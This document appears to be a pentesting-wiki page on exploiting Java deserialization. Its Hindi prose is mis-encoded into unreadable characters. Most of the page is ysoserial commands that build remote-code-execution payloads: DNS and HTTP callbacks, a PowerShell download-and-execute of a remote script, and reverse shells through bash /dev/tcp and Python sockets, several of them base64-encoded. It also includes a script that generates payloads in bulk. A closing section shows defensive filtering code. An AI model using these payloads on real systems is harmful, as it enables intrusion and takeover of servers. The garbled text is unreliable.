рдпрджрд┐ рдЖрдкрдХреЛ рдПрдХ рдЬрд╛рд╡рд╛ рд╕рдВрдЪрд┐рдд рд╡рд╕реНрддреБ рдорд┐рд▓рддреА рд╣реИ рдЬреЛ рдПрдХ рд╡реЗрдм рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдореЗрдВ рднреЗрдЬреА рдЬрд╛ рд░рд╣реА рд╣реИ, рддреЛ рдЖрдк [**SerializationDumper**](https://github.com/NickstaDB/SerializationDumper) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рддрд╛рдХрд┐ рднреЗрдЬреЗ рдЬрд╛ рд░рд╣реЗ рд╕рдВрдЪрдпрди рд╡рд╕реНрддреБ рдХреЛ рдПрдХ рдЕрдзрд┐рдХ рдорд╛рдирд╡ рдпреЛрдЧреНрдп рдкреНрд░рд╛рд░реВрдк рдореЗрдВ рдкреНрд░рд┐рдВрдЯ рдХрд░ рд╕рдХреЗрдВред рдЬрд╛рдирдирд╛ рдХрд┐ рдЖрдк рдХреМрди рд╕рд╛ рдбреЗрдЯрд╛ рднреЗрдЬ рд░рд╣реЗ рд╣реИрдВ рдЙрд╕реЗ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдирд╛ рдФрд░ рдХреБрдЫ рдЬрд╛рдВрдЪреЛрдВ рдХреЛ рдЫрд▓рдХрд░рдирд╛ рдЖрд╕рд╛рди рд╣реЛрдЧрд╛ред

### **рдЙрддреНрдкреАрдбрд╝рди**

#### **ysoserial**

рдЬрд╛рд╡рд╛ рдЙрддреНрдкреАрдбрд╝рдиреЛрдВ рдХреЛ рдЙрддреНрдкреАрдбрд╝рди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдореБрдЦреНрдп рдЙрдкрдХрд░рдг [**ysoserial**](https://github.com/frohoff/ysoserial) рд╣реИ ([**рдпрд╣рд╛рдБ рд╕реЗ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ**](https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar))ред рдЖрдк [**ysoseral-modified**](https://github.com/pimps/ysoserial-modified) рдХрд╛ рднреА рд╡рд┐рдЪрд╛рд░ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬреЛ рдЖрдкрдХреЛ рдЬрдЯрд┐рд▓ рдХрдорд╛рдВрдб (рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП рдкрд╛рдЗрдкреНрд╕ рдХреЗ рд╕рд╛рде) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рджреЗрдЧрд╛ред\
рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдпрд╣ рдЙрдкрдХрд░рдг **`ObjectInputStream`** рдкрд░ рдЙрддреНрдкреАрдбрд╝рди рдХрд░рдиреЗ рдкрд░ **рдХреЗрдВрджреНрд░рд┐рдд** рд╣реИред\
рдореИрдВ **"URLDNS"** рдкреЗрд▓реЛрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рд╢реБрд░реВ рдХрд░реВрдВрдЧрд╛ **RCE** рдкреЗрд▓реЛрдб рд╕реЗ рдкрд╣рд▓реЗ рдЙрд╕реЗ рдЬрд╛рдВрдЪрдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐ рдХреНрдпрд╛ рд╕рдВрдзрд╛рд░рдг рд╕рдВрднрд╡ рд╣реИред рдлрд┐рд░ рднреА, рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рд╢рд╛рдпрдж "URLDNS" рдкреЗрд▓реЛрдб рдХрд╛рдо рдирд╣реАрдВ рдХрд░ рд░рд╣рд╛ рд╣реЛ рд▓реЗрдХрд┐рди рдЕрдиреНрдп RCE рдкреЗрд▓реЛрдб рдХрд╛рдо рдХрд░ рд░рд╣рд╛ рд╣реЛред
```bash
# PoC to make the application perform a DNS req
java -jar ysoserial-master-SNAPSHOT.jar URLDNS http://b7j40108s43ysmdpplgd3b7rdij87x.burpcollaborator.net > payload

# PoC RCE in Windows
# Ping
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections5 'cmd /c ping -n 5 127.0.0.1' > payload
# Time, I noticed the response too longer when this was used
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c timeout 5" > payload
# Create File
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c echo pwned> C:\\\\Users\\\\username\\\\pwn" > payload
# DNS request
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c nslookup jvikwa34jwgftvoxdz16jhpufllb90.burpcollaborator.net"
# HTTP request (+DNS)
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c certutil -urlcache -split -f http://j4ops7g6mi9w30verckjrk26txzqnf.burpcollaborator.net/a a"
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAYwBlADcAMABwAG8AbwB1ADAAaABlAGIAaQAzAHcAegB1AHMAMQB6ADIAYQBvADEAZgA3ADkAdgB5AC4AYgB1AHIAcABjAG8AbABsAGEAYgBvAHIAYQB0AG8AcgAuAG4AZQB0AC8AYQAnACkA"
## In the ast http request was encoded: IEX(New-Object Net.WebClient).downloadString('http://1ce70poou0hebi3wzus1z2ao1f79vy.burpcollaborator.net/a')
## To encode something in Base64 for Windows PS from linux you can use: echo -n "<PAYLOAD>" | iconv --to-code UTF-16LE | base64 -w0
# Reverse Shell
## Encoded: IEX(New-Object Net.WebClient).downloadString('http://192.168.1.4:8989/powercat.ps1')
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAxAC4ANAA6ADgAOQA4ADkALwBwAG8AdwBlAHIAYwBhAHQALgBwAHMAMQAnACkA"

#PoC RCE in Linux
# Ping
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "ping -c 5 192.168.1.4" > payload
# Time
## Using time in bash I didn't notice any difference in the timing of the response
# Create file
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "touch /tmp/pwn" > payload
# DNS request
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "dig ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net"
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "nslookup ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net"
# HTTP request (+DNS)
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "curl ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net" > payload
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "wget ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net"
# Reverse shell
## Encoded: bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYx}|{base64,-d}|{bash,-i}" | base64 -w0
## Encoded: export RHOST="127.0.0.1";export RPORT=12345;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "bash -c {echo,ZXhwb3J0IFJIT1NUPSIxMjcuMC4wLjEiO2V4cG9ydCBSUE9SVD0xMjM0NTtweXRob24gLWMgJ2ltcG9ydCBzeXMsc29ja2V0LG9zLHB0eTtzPXNvY2tldC5zb2NrZXQoKTtzLmNvbm5lY3QoKG9zLmdldGVudigiUkhPU1QiKSxpbnQob3MuZ2V0ZW52KCJSUE9SVCIpKSkpO1tvcy5kdXAyKHMuZmlsZW5vKCksZmQpIGZvciBmZCBpbiAoMCwxLDIpXTtwdHkuc3Bhd24oIi9iaW4vc2giKSc=}|{base64,-d}|{bash,-i}"

# Base64 encode payload in base64
base64 -w0 payload
```
рдЬрдм **java.lang.Runtime.exec()** рдХреЗ рд▓рд┐рдП рдПрдХ payload рдмрдирд╛рддреЗ рд╣реИрдВ рддреЛ рдЖрдк **рд╡рд┐рд╢реЗрд╖ рд╡рд░реНрдг** рдЬреИрд╕реЗ ">" рдпрд╛ "|" рдХрд╛ рдЙрдкрдпреЛрдЧ рдирд╣реАрдВ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рддрд╛рдХрд┐ рдХрд┐рд╕реА рдХрд╛рд░реНрд░рд╡рд╛рдИ рдХреЗ рдЖрдЙрдЯрдкреБрдЯ рдХреЛ рд░реАрдбрд╛рдпрд░реЗрдХреНрдЯ рдХрд░реЗрдВ, "$()" рдХреЛ рдХрдорд╛рдВрдб рдЪрд▓рд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдпрд╛ рдпрд╣рд╛рдБ рддрдХ рдХрд┐ **рдХрд┐рд╕реА рдХрдорд╛рдВрдб рдХреЛ рдЕрд▓рдЧ-рдЕрд▓рдЧ рдЕрд░реНрдЧреНрдпреВрдореЗрдВрдЯреНрд╕** рдХреЗ рд╕рд╛рде рдЕрд▓рдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП **рдЕрдВрддрд░рд┐рдХреНрд╖реЛрдВ** рд╕реЗ (рдЖрдк `echo -n "hello world"` рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рд▓реЗрдХрд┐рди рдЖрдк `python2 -c 'print "Hello world"'` рдирд╣реАрдВ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ)ред рдкреЗрд▓реЛрдб рдХреЛ рд╕рд╣реА рдврдВрдЧ рд╕реЗ рдЗрдиреНрдХреЛрдб рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдк [рдЗрд╕ рд╡реЗрдмрдкреЗрдЬ](http://www.jackson-t.ca/runtime-exec-payloads.html) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

рд╡рд┐рдиреНрдбреЛрдЬ рдФрд░ рд▓рд┐рдирдХреНрд╕ рдХреЗ рд▓рд┐рдП **рд╕рднреА рд╕рдВрднрд╛рд╡рд┐рдд рдХреЛрдб рдПрдХреНрд╕реАрдХреНрдпреВрд╢рди** payloads рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ рдФрд░ рдлрд┐рд░ рдЙрдиреНрд╣реЗрдВ рд╡рд┐рдХрд▓реНрдкреА рд╡реЗрдм рдкреЗрдЬ рдкрд░ рдЯреЗрд╕реНрдЯ рдХрд░реЗрдВ:
```python
import os
import base64

# You may need to update the payloads
payloads = ['BeanShell1', 'Clojure', 'CommonsBeanutils1', 'CommonsCollections1', 'CommonsCollections2', 'CommonsCollections3', 'CommonsCollections4', 'CommonsCollections5', 'CommonsCollections6', 'CommonsCollections7', 'Groovy1', 'Hibernate1', 'Hibernate2', 'JBossInterceptors1', 'JRMPClient', 'JSON1', 'JavassistWeld1', 'Jdk7u21', 'MozillaRhino1', 'MozillaRhino2', 'Myfaces1', 'Myfaces2', 'ROME', 'Spring1', 'Spring2', 'Vaadin1', 'Wicket1']
def generate(name, cmd):
for payload in payloads:
final = cmd.replace('REPLACE', payload)
print 'Generating ' + payload + ' for ' + name + '...'
command = os.popen('java -jar ysoserial.jar ' + payload + ' "' + final + '"')
result = command.read()
command.close()
encoded = base64.b64encode(result)
if encoded != "":
open(name + '_intruder.txt', 'a').write(encoded + '\n')

generate('Windows', 'ping -n 1 win.REPLACE.server.local')
generate('Linux', 'ping -c 1 nix.REPLACE.server.local')
```
#### рд╕реАрд░рд┐рдпрд▓рдХрд┐рд▓рд░рдмрд╛рдпрдкрд╛рд╕рдЧреИрдЬреЗрдЯреНрд╕

рдЖрдк **рдЗрд╕реНрддреЗрдорд╛рд▓** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ [**https://github.com/pwntester/SerialKillerBypassGadgetCollection**](https://github.com/pwntester/SerialKillerBypassGadgetCollection) **ysoserial рдХреЗ рд╕рд╛рде рдЕрдзрд┐рдХ рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯреНрд╕ рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП**ред рдЗрд╕ рдЯреВрд▓ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА **рдЯреЙрдХ рдХреЗ рд╕реНрд▓рд╛рдЗрдбреНрд╕** рдореЗрдВ рд╣реИ рдЬрд╣рд╛рдБ рдЯреВрд▓ рдкреНрд░рд╕реНрддреБрдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛: [https://es.slideshare.net/codewhitesec/java-deserialization-vulnerabilities-the-forgotten-bug-class?next\_slideshow=1](https://es.slideshare.net/codewhitesec/java-deserialization-vulnerabilities-the-forgotten-bug-class?next\_slideshow=1)

#### рдорд╛рд░реНрд╢рд▓рд╕реЗрдХ

[**рдорд╛рд░реНрд╢рд▓рд╕реЗрдХ** ](https://github.com/mbechler/marshalsec)рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рд╡рд┐рднрд┐рдиреНрди **Json** рдФрд░ **Yml** рд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬреЗрд╢рди рд▓рд╛рдЗрдмреНрд░реЗрд░реАрдЬ рдХреЛ рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдПред\
рдкреНрд░реЛрдЬреЗрдХреНрдЯ рдХреЛ рдХрдВрдкрд╛рдЗрд▓ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдореБрдЭреЗ **рдЗрд╕** **рдбрд┐рдкреЗрдВрдбреЗрдВрд╕реАрдЬ** рдХреЛ `pom.xml` рдореЗрдВ **рдЬреЛрдбрд╝рдиреЗ** рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдереА:
```markup
<dependency>
<groupId>javax.activation</groupId>
<artifactId>activation</artifactId>
<version>1.1.1</version>
</dependency>

<dependency>
<groupId>com.sun.jndi</groupId>
<artifactId>rmiregistry</artifactId>
<version>1.2.1</version>
<type>pom</type>
</dependency>
```
**рдореЗрд╡реЗрди рдЗрдВрд╕реНрдЯреЙрд▓** рдХрд░реЗрдВ, рдФрд░ **рдкрд░рд┐рдпреЛрдЬрдирд╛ рдХреЛ рдХреЙрдореНрдкрд╛рдЗрд▓** рдХрд░реЗрдВ:
```bash
sudo apt-get install maven
mvn clean package -DskipTests
```
#### FastJSON

рдЗрд╕ Java JSON рдкреБрд╕реНрддрдХрд╛рд▓рдп рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдкрдврд╝реЗрдВ: [https://www.alphabot.com/security/blog/2020/java/Fastjson-exceptional-deserialization-vulnerabilities.html](https://www.alphabot.com/security/blog/2020/java/Fastjson-exceptional-deserialization-vulnerabilities.html)

### Labs

* рдпрджрд┐ рдЖрдк рдХреБрдЫ ysoserial payloads рдХрд╛ рдкрд░реАрдХреНрд╖рдг рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рддреЛ рдЖрдк **рдЗрд╕ рд╡реЗрдм рдРрдк** рдХреЛ **рдЪрд▓рд╛ рд╕рдХрддреЗ рд╣реИрдВ**: [https://github.com/hvqzao/java-deserialize-webapp](https://github.com/hvqzao/java-deserialize-webapp)
* [https://diablohorn.com/2017/09/09/understanding-practicing-java-deserialization-exploits/](https://diablohorn.com/2017/09/09/understanding-practicing-java-deserialization-exploits/)

### Why

Java рд╡рд┐рднрд┐рдиреНрди рдЙрджреНрджреЗрд╢реНрдпреЛрдВ рдХреЗ рд▓рд┐рдП рдзрд╛рд░рдгрд╛ рдХрд╛ рдмрд╣реБрдд рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ:

* **HTTP requests**: Serialization is widely employed in the management of parameters, ViewState, cookies, etc.
* **RMI (Remote Method Invocation)**: The Java RMI protocol, which relies entirely on serialization, is a cornerstone for remote communication in Java applications.
* **RMI over HTTP**: This method is commonly used by Java-based thick client web applications, utilizing serialization for all object communications.
* **JMX (Java Management Extensions)**: JMX utilizes serialization for transmitting objects over the network.
* **Custom Protocols**: In Java, the standard practice involves the transmission of raw Java objects, which will be demonstrated in upcoming exploit examples.

### Prevention

#### Transient objects

A class that implements `Serializable` can implement as `transient` any object inside the class that shouldn't be serializable. For example:
```java
public class myAccount implements Serializable
{
private transient double profit; // declared transient
private transient double margin; // declared transient
```
#### рдПрдХ рдХрдХреНрд╖рд╛ рдХреА рд╕реАрд░реАрдпрдХрд░рдг рд╕реЗ рдмрдЪреЗрдВ рдЬреЛ Serializable рдХреЛ рд▓рд╛рдЧреВ рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ
рдЙрди рд╕реНрдерд┐рддрд┐рдпреЛрдВ рдореЗрдВ рдЬрд╣рд╛рдБ рдХреБрдЫ **рдСрдмреНрдЬреЗрдХреНрдЯ `Serializable` рдЗрдВрдЯрд░рдлреЗрд╕ рдХреЛ рд▓рд╛рдЧреВ** рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдП рдХреНрдпреЛрдВрдХрд┐ рдХрдХреНрд╖рд╛ рд╡рд╛рдВрд╢рд┐рдХреА рдХреЗ рдХрд╛рд░рдг, рдЕрдирдЬрд╛рди рдбрд┐рд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬрд╝реЗрд╢рди рдХрд╛ рдЦрддрд░рд╛ рд╣реЛрддрд╛ рд╣реИред рдЗрд╕реЗ рд░реЛрдХрдиреЗ рдХреЗ рд▓рд┐рдП, рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░реЗрдВ рдХрд┐ рдпреЗ рдСрдмреНрдЬреЗрдХреНрдЯреНрд╕ рдбрд┐рд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬрд╝реЗ рдирд╣реАрдВ рд╣реИрдВ, рдПрдХ `final` `readObject()` рд╡рд┐рдзрд┐ рдХреЛ рдкрд░рд┐рднрд╛рд╖рд┐рдд рдХрд░рдХреЗ рдЬреЛ рдирд┐рд░рдВрддрд░ рдПрдХ рдЕрдкрд╡рд╛рдж рдлреЗрдВрдХрддреА рд╣реИ, рдЬреИрд╕рд╛ рдиреАрдЪреЗ рджрд┐рдЦрд╛рдпрд╛ рдЧрдпрд╛ рд╣реИ:
```java
private final void readObject(ObjectInputStream in) throws java.io.IOException {
throw new java.io.IOException("Cannot be deserialized");
}
```
#### **рдЬрд╛рд╡рд╛ рдореЗрдВ рдбреЗрд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬрд╝реЗрд╢рди рд╕реБрд░рдХреНрд╖рд╛ рдХреЛ рдмрдврд╝рд╛рдирд╛**

**`java.io.ObjectInputStream` рдХреЛ рдХрд╕реНрдЯрдорд╛рдЗрдЬрд╝ рдХрд░рдирд╛** рдбреЗрд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬрд╝реЗрд╢рди рдкреНрд░рдХреНрд░рд┐рдпрд╛рдУрдВ рдХреЛ рд╕реБрд░рдХреНрд╖рд┐рдд рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рд╡реНрдпрд╛рд╡рд╣рд╛рд░рд┐рдХ рджреГрд╖реНрдЯрд┐рдХреЛрдг рд╣реИред рдпрд╣ рд╡рд┐рдзрд┐ рдЙрдкрдпреБрдХреНрдд рд╣реИ рдЬрдм:

* рдбреЗрд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬрд╝реЗрд╢рди рдХреЛрдб рдЖрдкрдХреЗ рдирд┐рдпрдВрддреНрд░рдг рдореЗрдВ рд╣реИред
* рдбреЗрд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬрд╝реЗрд╢рди рдХреЗ рд▓рд┐рдП рдЕрдкреЗрдХреНрд╖рд┐рдд рдХрдХреНрд╖рд╛рдПрдБ рдЬреНрдЮрд╛рдд рд╣реИрдВред

**`resolveClass()`** рдореЗрдердб рдХреЛ рдУрд╡рд░рд░рд╛рдЗрдб рдХрд░реЗрдВ рддрд╛рдХрд┐ рдХреЗрд╡рд▓ рдЕрдиреБрдордд рдХрдХреНрд╖рд╛рдУрдВ рдХреЗ рд▓рд┐рдП рдбреЗрд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬрд╝реЗрд╢рди рдХреЛ рд╕реАрдорд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗред рдЗрд╕рд╕реЗ `Bicycle` рдХрдХреНрд╖рд╛ рдХреЗ рд▓рд┐рдП рдбреЗрд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬрд╝реЗрд╢рди рдХреЛ рдкреНрд░рддрд┐рдмрдВрдзрд┐рдд рдХрд░рдиреЗ рдЬреИрд╕реЗ рдХреЗрд╡рд▓ рдЙрди рдХрдХреНрд╖рд╛рдУрдВ рдХреЛ рдбреЗрд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬрд╝ рдХрд░рдиреЗ рд╕реЗ рд░реЛрдХрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдЬреЛ рд╕реНрдкрд╖реНрдЯ рд░реВрдк рд╕реЗ рдЕрдиреБрдордд рд╣реИрдВ:
```java
// Code from https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html
public class LookAheadObjectInputStream extends ObjectInputStream {

public LookAheadObjectInputStream(InputStream inputStream) throws IOException {
super(inputStream);
}

/**
* Only deserialize instances of our expected Bicycle class
*/
@Override
protected Class<?> resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException {
if (!desc.getName().equals(Bicycle.class.getName())) {
throw new InvalidClassException("Unauthorized deserialization attempt", desc.getName());
}
return super.resolveClass(desc);
}
}
```
**рд╕реБрд░рдХреНрд╖рд╛ рдореЗрдВ рд╕реБрдзрд╛рд░ рдХреЗ рд▓рд┐рдП рдЬрд╛рд╡рд╛ рдПрдЬреЗрдВрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ** рдПрдХ рд╡рд┐рдХрд▓реНрдк рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░рддрд╛ рд╣реИ рдЬрдм рдХреЛрдб рд╕рдВрд╢реЛрдзрди рд╕рдВрднрд╡ рдирд╣реАрдВ рд╣реЛрддрд╛ред рдпрд╣ рд╡рд┐рдзрд┐ рдореБрдЦреНрдп рд░реВрдк рд╕реЗ **рд╣рд╛рдирд┐рдХрд╛рд░рдХ рдХрдХреНрд╖рд╛рдУрдВ рдХреЛ рдмреНрд▓реИрдХрд▓рд┐рд╕реНрдЯ рдХрд░рдиреЗ** рдХреЗ рд▓рд┐рдП рд▓рд╛рдЧреВ рд╣реЛрддреА рд╣реИ, рдЬреЗрд╡реАрдПрдо рдкреИрд░рд╛рдореАрдЯрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ:
```
-javaagent:name-of-agent.jar
```
рдпрд╣ рдПрдХ рддрд░реАрдХрд╛ рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИ рдЬреЛ рдбреЗрд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬрд╝реЗрд╢рди рдХреЛ рдирд╛рдорд┐рдХреАрди рд░реВрдк рд╕реЗ рд╕реБрд░рдХреНрд╖рд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреБрдХреНрдд рд╣реИ, рдЬреЛ рд╕реНрдерд┐рддрд┐рдпреЛрдВ рдХреЗ рд▓рд┐рдП рдЖрдж immediate рдХреЛрдб рдкрд░рд┐рд╡рд░реНрддрди рдЕрд╕рдВрднрд╡ рд╣реИрдВред

[rO0 by Contrast Security](https://github.com/Contrast-Security-OSS/contrast-rO0) рдореЗрдВ рдПрдХ рдЙрджрд╛рд╣рд░рдг рджреЗрдЦреЗрдВред

**рд╕рд┐рд░реАрдпрд▓рд╛рдЗрдЬрд╝реЗрд╢рди рдлрд╝рд┐рд▓реНрдЯрд░реНрд╕ рдХрд╛ рд▓рд╛рдЧреВ рдХрд░рдирд╛**: рдЬрд╛рд╡рд╛ 9 рдиреЗ **`ObjectInputFilter`** рдЗрдВрдЯрд░рдлреЗрд╕ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╕рд┐рд░реАрдпрд▓рд╛рдЗрдЬрд╝реЗрд╢рди рдлрд╝рд┐рд▓реНрдЯрд░реНрд╕ рдХреЛ рдкреЗрд╢ рдХрд┐рдпрд╛, рдЬреЛ рдбреЗрд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬрд╝ рдХрд┐рдП рдЬрд╛рдиреЗ рд╕реЗ рдкрд╣рд▓реЗ рд╕рд┐рд░реАрдпрд▓рд╛рдЗрдЬрд╝ рдХрд┐рдП рдЧрдП рдСрдмреНрдЬреЗрдХреНрдЯреНрд╕ рдХреЛ рдХрд┐рд╕реА рдорд╛рдирдХ рдХреЛ рдкреВрд░рд╛ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рд╢рдХреНрддрд┐рд╢рд╛рд▓реА рддрдВрддреНрд░ рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИред рдпреЗ рдлрд╝рд┐рд▓реНрдЯрд░реНрд╕ рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ рд░реВрдк рд╕реЗ рдпрд╛ рдкреНрд░рддрд┐ рд╕реНрдЯреНрд░реАрдо рдХреЗ рд▓рд┐рдП рд▓рд╛рдЧреВ рдХрд┐рдП рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВ, рдЬреЛ рдбреЗрд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬрд╝реЗрд╢рди рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдкрд░ рдПрдХ рд╡рд┐рд╕реНрддрд╛рд░рдгреАрдп рдирд┐рдпрдВрддреНрд░рдг рдкреНрд░рджрд╛рди рдХрд░рддреЗ рд╣реИрдВред

рд╕рд┐рд░реАрдпрд▓рд╛рдЗрдЬрд╝реЗрд╢рди рдлрд╝рд┐рд▓реНрдЯрд░реНрд╕ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдЖрдк рдПрдХ рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ рдлрд╝рд┐рд▓реНрдЯрд░ рд╕реЗрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬреЛ рд╕рднреА рдбреЗрд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬрд╝реЗрд╢рди рдкреНрд░рдХреНрд░рд┐рдпрд╛рдУрдВ рдкрд░ рд▓рд╛рдЧреВ рд╣реЛрддрд╛ рд╣реИ рдпрд╛ рдЗрд╕реЗ рд╡рд┐рд╢реЗрд╖ рд╕реНрдЯреНрд░реАрдо рдХреЗ рд▓рд┐рдП рдЧрддрд┐рд╢реАрд▓ рд░реВрдк рд╕реЗ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП:
```java
ObjectInputFilter filter = info -> {
if (info.depth() > MAX_DEPTH) return Status.REJECTED; // Limit object graph depth
if (info.references() > MAX_REFERENCES) return Status.REJECTED; // Limit references
if (info.serialClass() != null && !allowedClasses.contains(info.serialClass().getName())) {
return Status.REJECTED; // Restrict to allowed classes
}
return Status.ALLOWED;
};
ObjectInputFilter.Config.setSerialFilter(filter);
```
